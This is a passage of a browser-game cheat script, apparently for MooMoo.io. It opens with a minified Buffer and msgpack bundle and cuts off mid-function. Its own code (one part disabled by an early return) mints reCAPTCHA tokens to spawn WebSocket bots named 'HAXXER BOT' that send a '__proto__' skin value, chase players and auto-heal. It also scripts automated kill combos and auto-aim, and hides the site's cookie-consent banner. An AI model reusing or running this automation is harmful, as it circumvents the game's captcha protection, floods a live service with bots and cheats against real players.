i||M(t,r,e,4,3.4028234663852886e38,-3.4028234663852886e38),K.write(t,r,e,n,23,4),e+4}function F(t,r,e,n,i){return i||M(t,r,e,8,1.7976931348623157e308,-1.7976931348623157e308),K.write(t,r,e,n,52,8),e+8}function j(t){
if(t=z(t).replace(tt,""),t.length<2)return"";for(;t.length%4!==0;)t+="=";return t}function z(t){return t.trim?t.trim():t.replace(/^\s+|\s+$/g,"")}function V(t){return t<16?"0"+t.toString(16):t.toString(16)}function q(t,r){r=r||1/0;for(var e,n=t.length,i=null,o=[],f=0;f<n;++f){if(e=t.charCodeAt(f),e>55295&&e<57344){if(!i){if(e>56319){(r-=3)>-1&&o.push(239,191,189);continue}if(f+1===n){(r-=3)>-1&&o.push(239,191,189);continue}i=e;continue}if(e<56320){(r-=3)>-1&&o.push(239,191,189),i=e;continue}e=(i-55296<<10|e-56320)+65536}else i&&(r-=3)>-1&&o.push(239,191,189);if(i=null,e<128){if((r-=1)<0)break;o.push(e)}else if(e<2048){if((r-=2)<0)break;o.push(e>>6|192,63&e|128)}else if(e<65536){if((r-=3)<0)break;o.push(e>>12|224,e>>6&63|128,63&e|128)}else{if(!(e<1114112))throw new Error("Invalid code point");if((r-=4)<0)break;o.push(e>>18|240,e>>12&63|128,e>>6&63|128,63&e|128)}}return o}function W(t){for(var r=[],e=0;e<t.length;++e)r.push(255&t.charCodeAt(e));return r}function J(t,r){for(var e,n,i,o=[],f=0;f<t.length&&!((r-=2)<0);++f)e=t.charCodeAt(f),n=e>>8,i=e%256,o.push(i),o.push(n);return o}function X(t){return Z.toByteArray(j(t))}function G(t,r,e,n){for(var i=0;i<n&&!(i+e>=r.length||i>=t.length);++i)r[i+e]=t[i];return i}function H(t){return t!==t}var Z=t("base64-js"),K=t("ieee754"),Q=t("isarray");e.Buffer=Buffer,e.SlowBuffer=y,e.INSPECT_MAX_BYTES=50,Buffer.TYPED_ARRAY_SUPPORT=void 0!==r.TYPED_ARRAY_SUPPORT?r.TYPED_ARRAY_SUPPORT:n(),e.kMaxLength=i(),Buffer.poolSize=8192,Buffer._augment=function(t){return t.__proto__=Buffer.prototype,t},Buffer.from=function(t,r,e){return f(null,t,r,e)},Buffer.TYPED_ARRAY_SUPPORT&&(Buffer.prototype.__proto__=Uint8Array.prototype,Buffer.__proto__=Uint8Array,"undefined"!=typeof Symbol&&Symbol.species&&Buffer[Symbol.species]===Buffer&&Object.defineProperty(Buffer,Symbol.species,{value:null,configurable:!0})),Buffer.alloc=function(t,r,e){return a(null,t,r,e)},Buffer.allocUnsafe=function(t){return s(null,t)},Buffer.allocUnsafeSlow=function(t){return s(null,t)},Buffer.isBuffer=function(t){return!(null==t||!t._isBuffer)},Buffer.compare=function(t,r){if(!Buffer.isBuffer(t)||!Buffer.isBuffer(r))throw new TypeError("Arguments must be Buffers");if(t===r)return 0;for(var e=t.length,n=r.length,i=0,o=Math.min(e,n);i<o;++i)if(t[i]!==r[i]){e=t[i],n=r[i];break}return e<n?-1:n<e?1:0},Buffer.isEncoding=function(t){switch(String(t).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},Buffer.concat=function(t,r){if(!Q(t))throw new TypeError('"list" argument must be an Array of Buffers');if(0===t.length)return Buffer.alloc(0);var e;if(void 0===r)for(r=0,e=0;e<t.length;++e)r+=t[e].length;var n=Buffer.allocUnsafe(r),i=0;for(e=0;e<t.length;++e){var o=t[e];if(!Buffer.isBuffer(o))throw new TypeError('"list" argument must be an Array of Buffers');o.copy(n,i),i+=o.length}return n},Buffer.byteLength=v,Buffer.prototype._isBuffer=!0,Buffer.prototype.swap16=function(){var t=this.length;if(t%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(var r=0;r<t;r+=2)b(this,r,r+1);return this},Buffer.prototype.swap32=function(){var t=this.length;if(t%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(var r=0;r<t;r+=4)b(this,r,r+3),b(this,r+1,r+2);return this},Buffer.prototype.swap64=function(){var t=this.length;if(t%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(var r=0;r<t;r+=8)b(this,r,r+7),b(this,r+1,r+6),b(this,r+2,r+5),b(this,r+3,r+4);return this},Buffer.prototype.toString=function(){var t=0|this.length;return 0===t?"":0===arguments.length?k(this,0,t):g.apply(this,arguments)},Buffer.prototype.equals=function(t){if(!Buffer.isBuffer(t))throw new TypeError("Argument must be a Buffer");return this===t||0===Buffer.compare(this,t)},Buffer.prototype.inspect=function(){var t="",r=e.INSPECT_MAX_BYTES;return this.length>0&&(t=this.toString("hex",0,r).match(/.{2}/g).join(" "),this.length>r&&(t+=" ... ")),"<Buffer "+t+">"},Buffer.prototype.compare=function(t,r,e,n,i){if(!Buffer.isBuffer(t))throw new TypeError("Argument must be a Buffer");if(void 0===r&&(r=0),void 0===e&&(e=t?t.length:0),void 0===n&&(n=0),void 0===i&&(i=this.length),r<0||e>t.length||n<0||i>this.length)throw new RangeError("out of range index");if(n>=i&&r>=e)return 0;if(n>=i)return-1;if(r>=e)return 1;if(r>>>=0,e>>>=0,n>>>=0,i>>>=0,this===t)return 0;for(var o=i-n,f=e-r,u=Math.min(o,f),a=this.slice(n,i),s=t.slice(r,e),c=0;c<u;++c)if(a[c]!==s[c]){o=a[c],f=s[c];break}return o<f?-1:f<o?1:0},Buffer.prototype.includes=function(t,r,e){return this.indexOf(t,r,e)!==-1},Buffer.prototype.indexOf=function(t,r,e){return w(this,t,r,e,!0)},Buffer.prototype.lastIndexOf=function(t,r,e){return w(this,t,r,e,!1)},Buffer.prototype.write=function(t,r,e,n){if(void 0===r)n="utf8",e=this.length,r=0;else if(void 0===e&&"string"==typeof r)n=r,e=this.length,r=0;else{if(!isFinite(r))throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");r=0|r,isFinite(e)?(e=0|e,void 0===n&&(n="utf8")):(n=e,e=void 0)}var i=this.length-r;if((void 0===e||e>i)&&(e=i),t.length>0&&(e<0||r<0)||r>this.length)throw new RangeError("Attempt to write outside buffer bounds");n||(n="utf8");for(var o=!1;;)switch(n){case"hex":return A(this,t,r,e);case"utf8":case"utf-8":return m(this,t,r,e);case"ascii":return x(this,t,r,e);case"latin1":case"binary":return B(this,t,r,e);case"base64":return U(this,t,r,e);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return P(this,t,r,e);default:if(o)throw new TypeError("Unknown encoding: "+n);n=(""+n).toLowerCase(),o=!0}},Buffer.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};var $=4096;Buffer.prototype.slice=function(t,r){var e=this.length;t=~~t,r=void 0===r?e:~~r,t<0?(t+=e,t<0&&(t=0)):t>e&&(t=e),r<0?(r+=e,r<0&&(r=0)):r>e&&(r=e),r<t&&(r=t);var n;if(Buffer.TYPED_ARRAY_SUPPORT)n=this.subarray(t,r),n.__proto__=Buffer.prototype;else{var i=r-t;n=new Buffer(i,void 0);for(var o=0;o<i;++o)n[o]=this[o+t]}return n},Buffer.prototype.readUIntLE=function(t,r,e){t=0|t,r=0|r,e||C(t,r,this.length);for(var n=this[t],i=1,o=0;++o<r&&(i*=256);)n+=this[t+o]*i;return n},Buffer.prototype.readUIntBE=function(t,r,e){t=0|t,r=0|r,e||C(t,r,this.length);for(var n=this[t+--r],i=1;r>0&&(i*=256);)n+=this[t+--r]*i;return n},Buffer.prototype.readUInt8=function(t,r){return r||C(t,1,this.length),this[t]},Buffer.prototype.readUInt16LE=function(t,r){return r||C(t,2,this.length),this[t]|this[t+1]<<8},Buffer.prototype.readUInt16BE=function(t,r){return r||C(t,2,this.length),this[t]<<8|this[t+1]},Buffer.prototype.readUInt32LE=function(t,r){return r||C(t,4,this.length),(this[t]|this[t+1]<<8|this[t+2]<<16)+16777216*this[t+3]},Buffer.prototype.readUInt32BE=function(t,r){return r||C(t,4,this.length),16777216*this[t]+(this[t+1]<<16|this[t+2]<<8|this[t+3])},Buffer.prototype.readIntLE=function(t,r,e){t=0|t,r=0|r,e||C(t,r,this.length);for(var n=this[t],i=1,o=0;++o<r&&(i*=256);)n+=this[t+o]*i;return i*=128,n>=i&&(n-=Math.pow(2,8*r)),n},Buffer.prototype.readIntBE=function(t,r,e){t=0|t,r=0|r,e||C(t,r,this.length);for(var n=r,i=1,o=this[t+--n];n>0&&(i*=256);)o+=this[t+--n]*i;return i*=128,o>=i&&(o-=Math.pow(2,8*r)),o},Buffer.prototype.readInt8=function(t,r){return r||C(t,1,this.length),128&this[t]?(255-this[t]+1)*-1:this[t]},Buffer.prototype.readInt16LE=function(t,r){r||C(t,2,this.length);var e=this[t]|this[t+1]<<8;return 32768&e?4294901760|e:e},Buffer.prototype.readInt16BE=function(t,r){r||C(t,2,this.length);var e=this[t+1]|this[t]<<8;return 32768&e?4294901760|e:e},Buffer.prototype.readInt32LE=function(t,r){return r||C(t,4,this.length),this[t]|this[t+1]<<8|this[t+2]<<16|this[t+3]<<24},Buffer.prototype.readInt32BE=function(t,r){return r||C(t,4,this.length),this[t]<<24|this[t+1]<<16|this[t+2]<<8|this[t+3]},Buffer.prototype.readFloatLE=function(t,r){return r||C(t,4,this.length),K.read(this,t,!0,23,4)},Buffer.prototype.readFloatBE=function(t,r){return r||C(t,4,this.length),K.read(this,t,!1,23,4)},Buffer.prototype.readDoubleLE=function(t,r){return r||C(t,8,this.length),K.read(this,t,!0,52,8)},Buffer.prototype.readDoubleBE=function(t,r){return r||C(t,8,this.length),K.read(this,t,!1,52,8)},Buffer.prototype.writeUIntLE=function(t,r,e,n){if(t=+t,r=0|r,e=0|e,!n){var i=Math.pow(2,8*e)-1;D(this,t,r,e,i,0)}var o=1,f=0;for(this[r]=255&t;++f<e&&(o*=256);)this[r+f]=t/o&255;return r+e},Buffer.prototype.writeUIntBE=function(t,r,e,n){if(t=+t,r=0|r,e=0|e,!n){var i=Math.pow(2,8*e)-1;D(this,t,r,e,i,0)}var o=e-1,f=1;for(this[r+o]=255&t;--o>=0&&(f*=256);)this[r+o]=t/f&255;return r+e},Buffer.prototype.writeUInt8=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,1,255,0),Buffer.TYPED_ARRAY_SUPPORT||(t=Math.floor(t)),this[r]=255&t,r+1},Buffer.prototype.writeUInt16LE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,2,65535,0),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=255&t,this[r+1]=t>>>8):O(this,t,r,!0),r+2},Buffer.prototype.writeUInt16BE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,2,65535,0),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=t>>>8,this[r+1]=255&t):O(this,t,r,!1),r+2},Buffer.prototype.writeUInt32LE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,4,4294967295,0),Buffer.TYPED_ARRAY_SUPPORT?(this[r+3]=t>>>24,this[r+2]=t>>>16,this[r+1]=t>>>8,this[r]=255&t):L(this,t,r,!0),r+4},Buffer.prototype.writeUInt32BE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,4,4294967295,0),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=t>>>24,this[r+1]=t>>>16,this[r+2]=t>>>8,this[r+3]=255&t):L(this,t,r,!1),r+4},Buffer.prototype.writeIntLE=function(t,r,e,n){if(t=+t,r=0|r,!n){var i=Math.pow(2,8*e-1);D(this,t,r,e,i-1,-i)}var o=0,f=1,u=0;for(this[r]=255&t;++o<e&&(f*=256);)t<0&&0===u&&0!==this[r+o-1]&&(u=1),this[r+o]=(t/f>>0)-u&255;return r+e},Buffer.prototype.writeIntBE=function(t,r,e,n){if(t=+t,r=0|r,!n){var i=Math.pow(2,8*e-1);D(this,t,r,e,i-1,-i)}var o=e-1,f=1,u=0;for(this[r+o]=255&t;--o>=0&&(f*=256);)t<0&&0===u&&0!==this[r+o+1]&&(u=1),this[r+o]=(t/f>>0)-u&255;return r+e},Buffer.prototype.writeInt8=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,1,127,-128),Buffer.TYPED_ARRAY_SUPPORT||(t=Math.floor(t)),t<0&&(t=255+t+1),this[r]=255&t,r+1},Buffer.prototype.writeInt16LE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,2,32767,-32768),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=255&t,this[r+1]=t>>>8):O(this,t,r,!0),r+2},Buffer.prototype.writeInt16BE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,2,32767,-32768),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=t>>>8,this[r+1]=255&t):O(this,t,r,!1),r+2},Buffer.prototype.writeInt32LE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,4,2147483647,-2147483648),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=255&t,this[r+1]=t>>>8,this[r+2]=t>>>16,this[r+3]=t>>>24):L(this,t,r,!0),r+4},Buffer.prototype.writeInt32BE=function(t,r,e){return t=+t,r=0|r,e||D(this,t,r,4,2147483647,-2147483648),t<0&&(t=4294967295+t+1),Buffer.TYPED_ARRAY_SUPPORT?(this[r]=t>>>24,this[r+1]=t>>>16,this[r+2]=t>>>8,this[r+3]=255&t):L(this,t,r,!1),r+4},Buffer.prototype.writeFloatLE=function(t,r,e){return N(this,t,r,!0,e)},Buffer.prototype.writeFloatBE=function(t,r,e){return N(this,t,r,!1,e)},Buffer.prototype.writeDoubleLE=function(t,r,e){return F(this,t,r,!0,e)},Buffer.prototype.writeDoubleBE=function(t,r,e){return F(this,t,r,!1,e)},Buffer.prototype.copy=function(t,r,e,n){if(e||(e=0),n||0===n||(n=this.length),r>=t.length&&(r=t.length),r||(r=0),n>0&&n<e&&(n=e),n===e)return 0;if(0===t.length||0===this.length)return 0;if(r<0)throw new RangeError("targetStart out of bounds");if(e<0||e>=this.length)throw new RangeError("sourceStart out of bounds");if(n<0)throw new RangeError("sourceEnd out of bounds");n>this.length&&(n=this.length),t.length-r<n-e&&(n=t.length-r+e);var i,o=n-e;if(this===t&&e<r&&r<n)for(i=o-1;i>=0;--i)t[i+r]=this[i+e];else if(o<1e3||!Buffer.TYPED_ARRAY_SUPPORT)for(i=0;i<o;++i)t[i+r]=this[i+e];else Uint8Array.prototype.set.call(t,this.subarray(e,e+o),r);return o},Buffer.prototype.fill=function(t,r,e,n){if("string"==typeof t){if("string"==typeof r?(n=r,r=0,e=this.length):"string"==typeof e&&(n=e,e=this.length),1===t.length){var i=t.charCodeAt(0);i<256&&(t=i)}if(void 0!==n&&"string"!=typeof n)throw new TypeError("encoding must be a string");if("string"==typeof n&&!Buffer.isEncoding(n))throw new TypeError("Unknown encoding: "+n)}else"number"==typeof t&&(t=255&t);if(r<0||this.length<r||this.length<e)throw new RangeError("Out of range index");if(e<=r)return this;r>>>=0,e=void 0===e?this.length:e>>>0,t||(t=0);var o;if("number"==typeof t)for(o=r;o<e;++o)this[o]=t;else{var f=Buffer.isBuffer(t)?t:q(new Buffer(t,n).toString()),u=f.length;for(o=0;o<e-r;++o)this[o+r]=f[o%u]}return this};var tt=/[^+\/0-9A-Za-z-_]/g}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"base64-js":30,ieee754:32,isarray:34}],30:[function(t,r,e){"use strict";function n(t){var r=t.length;if(r%4>0)throw new Error("Invalid string. Length must be a multiple of 4");return"="===t[r-2]?2:"="===t[r-1]?1:0}function i(t){return 3*t.length/4-n(t)}function o(t){var r,e,i,o,f,u,a=t.length;f=n(t),u=new h(3*a/4-f),i=f>0?a-4:a;var s=0;for(r=0,e=0;r<i;r+=4,e+=3)o=c[t.charCodeAt(r)]<<18|c[t.charCodeAt(r+1)]<<12|c[t.charCodeAt(r+2)]<<6|c[t.charCodeAt(r+3)],u[s++]=o>>16&255,u[s++]=o>>8&255,u[s++]=255&o;return 2===f?(o=c[t.charCodeAt(r)]<<2|c[t.charCodeAt(r+1)]>>4,u[s++]=255&o):1===f&&(o=c[t.charCodeAt(r)]<<10|c[t.charCodeAt(r+1)]<<4|c[t.charCodeAt(r+2)]>>2,u[s++]=o>>8&255,u[s++]=255&o),u}function f(t){return s[t>>18&63]+s[t>>12&63]+s[t>>6&63]+s[63&t]}function u(t,r,e){for(var n,i=[],o=r;o<e;o+=3)n=(t[o]<<16)+(t[o+1]<<8)+t[o+2],i.push(f(n));return i.join("")}function a(t){for(var r,e=t.length,n=e%3,i="",o=[],f=16383,a=0,c=e-n;a<c;a+=f)o.push(u(t,a,a+f>c?c:a+f));return 1===n?(r=t[e-1],i+=s[r>>2],i+=s[r<<4&63],i+="=="):2===n&&(r=(t[e-2]<<8)+t[e-1],i+=s[r>>10],i+=s[r>>4&63],i+=s[r<<2&63],i+="="),o.push(i),o.join("")}e.byteLength=i,e.toByteArray=o,e.fromByteArray=a;for(var s=[],c=[],h="undefined"!=typeof Uint8Array?Uint8Array:Array,l="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",p=0,d=l.length;p<d;++p)s[p]=l[p],c[l.charCodeAt(p)]=p;c["-".charCodeAt(0)]=62,c["_".charCodeAt(0)]=63},{}],31:[function(t,r,e){function n(){if(!(this instanceof n))return new n}!function(t){function e(t){for(var r in s)t[r]=s[r];return t}function n(t,r){return u(this,t).push(r),this}function i(t,r){function e(){o.call(n,t,e),r.apply(this,arguments)}var n=this;return e.originalListener=r,u(n,t).push(e),n}function o(t,r){function e(t){return t!==r&&t.originalListener!==r}var n,i=this;if(arguments.length){if(r){if(n=u(i,t,!0)){if(n=n.filter(e),!n.length)return o.call(i,t);i[a][t]=n}}else if(n=i[a],n&&(delete n[t],!Object.keys(n).length))return o.call(i)}else delete i[a];return i}function f(t,r){function e(t){t.call(o)}function n(t){t.call(o,r)}function i(t){t.apply(o,s)}var o=this,f=u(o,t,!0);if(!f)return!1;var a=arguments.length;if(1===a)f.forEach(e);else if(2===a)f.forEach(n);else{var s=Array.prototype.slice.call(arguments,1);f.forEach(i)}return!!f.length}function u(t,r,e){if(!e||t[a]){var n=t[a]||(t[a]={});return n[r]||(n[r]=[])}}"undefined"!=typeof r&&(r.exports=t);var a="listeners",s={on:n,once:i,off:o,emit:f};e(t.prototype),t.mixin=e}(n)},{}],32:[function(t,r,e){e.read=function(t,r,e,n,i){var o,f,u=8*i-n-1,a=(1<<u)-1,s=a>>1,c=-7,h=e?i-1:0,l=e?-1:1,p=t[r+h];for(h+=l,o=p&(1<<-c)-1,p>>=-c,c+=u;c>0;o=256*o+t[r+h],h+=l,c-=8);for(f=o&(1<<-c)-1,o>>=-c,c+=n;c>0;f=256*f+t[r+h],h+=l,c-=8);if(0===o)o=1-s;else{if(o===a)return f?NaN:(p?-1:1)*(1/0);f+=Math.pow(2,n),o-=s}return(p?-1:1)*f*Math.pow(2,o-n)},e.write=function(t,r,e,n,i,o){var f,u,a,s=8*o-i-1,c=(1<<s)-1,h=c>>1,l=23===i?Math.pow(2,-24)-Math.pow(2,-77):0,p=n?0:o-1,d=n?1:-1,y=r<0||0===r&&1/r<0?1:0;for(r=Math.abs(r),isNaN(r)||r===1/0?(u=isNaN(r)?1:0,f=c):(f=Math.floor(Math.log(r)/Math.LN2),r*(a=Math.pow(2,-f))<1&&(f--,a*=2),r+=f+h>=1?l/a:l*Math.pow(2,1-h),r*a>=2&&(f++,a/=2),f+h>=c?(u=0,f=c):f+h>=1?(u=(r*a-1)*Math.pow(2,i),f+=h):(u=r*Math.pow(2,h-1)*Math.pow(2,i),f=0));i>=8;t[e+p]=255&u,p+=d,u/=256,i-=8);for(f=f<<i|u,s+=i;s>0;t[e+p]=255&f,p+=d,f/=256,s-=8);t[e+p-d]|=128*y}},{}],33:[function(t,r,e){(function(Buffer){var t,r,n,i;!function(e){function o(t,r,n){function i(t,r,e,n){return this instanceof i?v(this,t,r,e,n):new i(t,r,e,n)}function o(t){return!(!t||!t[F])}function v(t,r,e,n,i){if(E&&A&&(r instanceof A&&(r=new E(r)),n instanceof A&&(n=new E(n))),!(r||e||n||g))return void(t.buffer=h(m,0));if(!s(r,e)){var o=g||Array;i=e,n=r,e=0,r=new o(8)}t.buffer=r,t.offset=e|=0,b!==typeof n&&("string"==typeof n?x(r,e,n,i||10):s(n,i)?c(r,e,n,i):"number"==typeof i?(k(r,e+T,n),k(r,e+S,i)):n>0?O(r,e,n):n<0?L(r,e,n):c(r,e,m,0))}function x(t,r,e,n){var i=0,o=e.length,f=0,u=0;"-"===e[0]&&i++;for(var a=i;i<o;){var s=parseInt(e[i++],n);if(!(s>=0))break;u=u*n+s,f=f*n+Math.floor(u/B),u%=B}a&&(f=~f,u?u=B-u:f++),k(t,r+T,f),k(t,r+S,u)}function P(){var t=this.buffer,r=this.offset,e=_(t,r+T),i=_(t,r+S);return n||(e|=0),e?e*B+i:i}function R(t){var r=this.buffer,e=this.offset,i=_(r,e+T),o=_(r,e+S),f="",u=!n&&2147483648&i;for(u&&(i=~i,o=B-o),t=t||10;;){var a=i%t*B+o;if(i=Math.floor(i/t),o=Math.floor(a/t),f=(a%t).toString(t)+f,!i&&!o)break}return u&&(f="-"+f),f}function k(t,r,e){t[r+D]=255&e,e>>=8,t[r+C]=255&e,e>>=8,t[r+Y]=255&e,e>>=8,t[r+I]=255&e}function _(t,r){return t[r+I]*U+(t[r+Y]<<16)+(t[r+C]<<8)+t[r+D]}var T=r?0:4,S=r?4:0,I=r?0:3,Y=r?1:2,C=r?2:1,D=r?3:0,O=r?l:d,L=r?p:y,M=i.prototype,N="is"+t,F="_"+N;return M.buffer=void 0,M.offset=0,M[F]=!0,M.toNumber=P,M.toString=R,M.toJSON=P,M.toArray=f,w&&(M.toBuffer=u),E&&(M.toArrayBuffer=a),i[N]=o,e[t]=i,i}function f(t){var r=this.buffer,e=this.offset;return g=null,t!==!1&&0===e&&8===r.length&&x(r)?r:h(r,e)}function u(t){var r=this.buffer,e=this.offset;if(g=w,t!==!1&&0===e&&8===r.length&&Buffer.isBuffer(r))return r;var n=new w(8);return c(n,0,r,e),n}function a(t){var r=this.buffer,e=this.offset,n=r.buffer;if(g=E,t!==!1&&0===e&&n instanceof A&&8===n.byteLength)return n;var i=new E(8);return c(i,0,r,e),i.buffer}function s(t,r){var e=t&&t.length;return r|=0,e&&r+8<=e&&"string"!=typeof t[r]}function c(t,r,e,n){r|=0,n|=0;for(var i=0;i<8;i++)t[r++]=255&e[n++]}function h(t,r){return Array.prototype.slice.call(t,r,r+8)}function l(t,r,e){for(var n=r+8;n>r;)t[--n]=255&e,e/=256}function p(t,r,e){var n=r+8;for(e++;n>r;)t[--n]=255&-e^255,e/=256}function d(t,r,e){for(var n=r+8;r<n;)t[r++]=255&e,e/=256}function y(t,r,e){var n=r+8;for(e++;r<n;)t[r++]=255&-e^255,e/=256}function v(t){return!!t&&"[object Array]"==Object.prototype.toString.call(t)}var g,b="undefined",w=b!==typeof Buffer&&Buffer,E=b!==typeof Uint8Array&&Uint8Array,A=b!==typeof ArrayBuffer&&ArrayBuffer,m=[0,0,0,0,0,0,0,0],x=Array.isArray||v,B=4294967296,U=16777216;t=o("Uint64BE",!0,!0),r=o("Int64BE",!0,!1),n=o("Uint64LE",!1,!0),i=o("Int64LE",!1,!1)}("object"==typeof e&&"string"!=typeof e.nodeName?e:this||{})}).call(this,t("buffer").Buffer)},{buffer:29}],34:[function(t,r,e){var n={}.toString;r.exports=Array.isArray||function(t){return"[object Array]"==n.call(t)}},{}]},{},[1])(1)});
                `;

                    function connectBot (link) {
                        return;
                        let wss = [];
                        let count = 3;
                        for(let id = 0;id<count;id++) {
                            window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {
                                action: "homepage"
                            }).then(function(token) {
                                addWorker(`let url = "${link}" + encodeURIComponent("${token}"),
    ws = new WebSocket(url),
    del = false;
${msgpackCode}
ws.binaryType = "arraybuffer", ws._send = function(e) {
    ws.send(new Uint8Array(msgpack.encode(e)))
}, ws._sid = 0;
let holdApplePacket = new Uint8Array(msgpack.encode(["5", [0, null]])),
    clickPackets = [new Uint8Array(msgpack.encode(["c", [1, null]])), new Uint8Array(msgpack.encode(["c", [0, null]]))],
    unholdPacket = new Uint8Array(msgpack.encode(["5", [0, !0]]));

function heal(e) {
    for (let s = 0; s < e; s++) ws.send(holdApplePacket), ws.send(clickPackets[0]), ws.send(clickPackets[1]), ws.send(unholdPacket)
}

self.onmessage = function (e) {
   let data = JSON.parse(e.data);
   if(data.item == "join") {
     ws._send(["10", [data.data]]);
   }
   if(data.item == "send") {
     ws._send(data.data);
   }
};

function genRandName () {
let names = [
"SANDY BOT",
"SANDY MOD V3",
"THE SACK BOT",
"HAXXER BOT"
]
return names[Math.floor(Math.random()*names.length)];
}

var randDir = Math.random() * Math.PI * 2;

setInterval(function () {randDir = Math.random()*Math.PI*2}, 20000);

ws.onopen = function() {
    setTimeout((function() {
        ws._send(["sp", [{
            name: genRandName(),
            skin: "__proto__",
            moofoll: 1
        }]])
    }), 200), ws.addEventListener("message", (function(e) {
        let s = msgpack.decode(new Uint8Array(e.data)).flat(1 / 0);
        switch (s.shift()) {
            case "io-init":
                break;
            case "1":
                ws._sid = s;
                break;
            case "2":

                break;
            case "33": {
                const e = 13;
                let n = [];
                for (let t = 0; t < s.length; t += e) {
                    const a = s.slice(t, t + e);
                    a[0] == ws._sid ? (n.push({
                        x: a[1],
                        y: a[2],
                        type: "bot"
                    }), ws.a = n[n.length - 1]) : n.push({
                        x: a[1],
                        y: a[2],
                        type: "player",
                        id: a[0]
                    })
                }
                if (self.postMessage(JSON.stringify(n)), ws.a) {
                    let e = n.filter((e => "player" == e.type)).sort(((e, s) => Math.hypot(e.y - ws.a.y, e.x - ws.a.x) - Math.hypot(s.y - ws.a.y, s.x - ws.a.x)))[0];
                    if (!e) {
                    ws._send(["33", [randDir]]);
                    } else {
                    ws._send(["33", [Math.atan2(e.y - ws.a.y, e.x - ws.a.x)]])
                    }
                }
            }
            break;
            case "11":
                ws._send(["sp", [{
                    name: genRandName(),
                    skin: "__proto__",
                    moofoll: 1
                }]]);
                break;
            case "h":
                s[0] == ws._sid && s[1] < 100 && (s[1] < 60 && !del ? (del = !0, heal(5), setTimeout((() => {
                    del = !1;
                }), 200)) : setTimeout(heal, 120, 5))
        }
    }))
};`, function (botPacket) {
                                    botPackets[id] = JSON.parse(botPacket.data);
                                });
                            });
                        }
                    }


                    function VS() {
                        let vhns = function () {
                            return W.filter(e => e.active && e.buildIndex > -1 && [6, 7, 8, 9].includes(e.buildIndex));
                        }
                        try {
                            vhns().forEach((e) => {
                                let v = e.sid;
                                VS.c[v] = VS.c[v] === undefined ? 0 : VS.c[v]+1;
                            });
                        } catch (z) {};
                    }

                    VS.c = [0];

                    /*VS.id = setInterval(function(){
                        VS.c = VS.c.map(e => Math.max(0, e-1));
                    }, 2000);*/

                    function instaX(type) {
                        aa = true;
                        setWeapon(0);
                        let BACKUP6050 = !(R.turretReload > 0.9 && (R.skins[53] || (R.points>1e4, Kt(53, 0))));

                        if(type && type != 3) {
                            switch(type) {
                                case 1:
                                    Hg(!ae86 ? 11 : 6, !ae86 ? 21 : 0);
                                    break;
                                case 2:
                                    Hg(7, !ae86 ? 18 : 0);
                                    break;
                            }
                        } else {
                            if(ae86 || type == 3) {
                                Hg(7, 0);
                            } else {
                                if([22, 6].includes(enemies[0].skinIndex) || BACKUP6050) {
                                    Hg(7, 0);
                                } else {
                                    Hg(enemies[0] == 7 ? 11 : 6, Math.random() >= 0.5 ? 21 : 18);
                                }
                            }
                        }
                        r.send("7", 1);
                        nextTickDo (() => {
                            setWeapon(1);
                            r.send("2", nea);
                            if(!BACKUP6050) {
                                Hg(53, !ae86 ? 21 : 0);
                                nextTickDo(() => {
                                    basicGear(0);
                                    aa = false;
                                    r.send("7", 1);
                                });
                            } else {
                                basicGear(0);
                                nextTickDo (() => {
                                    aa = false;
                                    r.send("7", 1);
                                });
                            }
                        });
                    }

                    function instaKH() {
                        aa = true;
                        let oW = aw;
                        setWeapon(1);
                        Hg(53, !ae86 ? 21 : 0);
                        r.send("7", 1);
                        nextTickDo(function(){
                            Hg(7, !ae86 ? 18 : 0);
                            setWeapon(0);
                            nextTickDo(function(){
                                Hg(6, 11);
                                aa = false;
                                setWeapon(oW);
                                r.send("7", 1);
                            });
                        });
                    }

                    setTimeout(() => {
                        if(document.getElementById("onetrust-consent-sdk")) {
                            document.getElementById("onetrust-consent-sdk").style.display = "none";
                        }
                    }, 3e3 / 9);

                    setInterval (() => {
                        updateEnemyData();
                    }, 300);

                    let mmd = Date.now();
                    function setAim(e) {
                        if(Date.now() - mmd > 200) {
                            mmd = Date.now();
                            ang = pn();
                            r.send("2", aa?nea : autobreak.it ? autobreak.a : ang);
                        }
                    }

                    function addTexts(f, d) {
                        if(spec || ae86) return;

                        let moo = true;

                        if(lur) {
                            be.beginPath();
                            be.font = "22px Hammersmith One";
                            be.lineWidth = 8;
                            be.strokeStyle = rt;
                            be.fillStyle = "white";
                            be.textAlign = "center";
                            be.strokeText(_.clownCounter, _.x - f, _.y - d + 119);
                            be.fillText(_.clownCounter, _.x - f, _.y - d + 119);
                            be.closePath();
                        } else if(fz){
                            if(_.sid == R.sid && R.alive) {
                                const a = [moo ? "false" : "true" , Pings.highest , Pings.lowest];

                                be.beginPath();
                                be.font = "20px Hammersmith One";
                                be.lineWidth = 5.5;
                                be.strokeStyle = rt;
                                be.fillStyle = "white";
                                be.textAlign = "center";
                                be.strokeText("[" + a.join(",") + "]", R.x - f, R.y - d + 133);
